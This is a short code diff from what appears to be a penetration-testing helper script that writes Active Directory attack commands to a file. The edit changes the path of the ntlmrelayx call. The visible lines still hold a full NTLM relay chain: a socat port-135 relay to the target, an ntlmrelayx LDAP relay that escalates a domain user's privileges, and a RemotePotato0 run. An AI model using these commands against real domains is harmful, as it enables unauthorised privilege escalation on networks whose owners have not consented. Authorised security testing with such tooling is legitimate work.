@@ -102,7 +102,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         if has_creds:
             f.write("# RemotePotato Check\n")
             f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
-            f.write(f"sudo ntlmrelayx.py -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
+            f.write(f"sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
             f.write(f".\\RemotePotato0.exe -m 2 -r {local_ip} -x {local_ip} -p 9999 -s 1\n\n")
 
         # SMB Enumeration
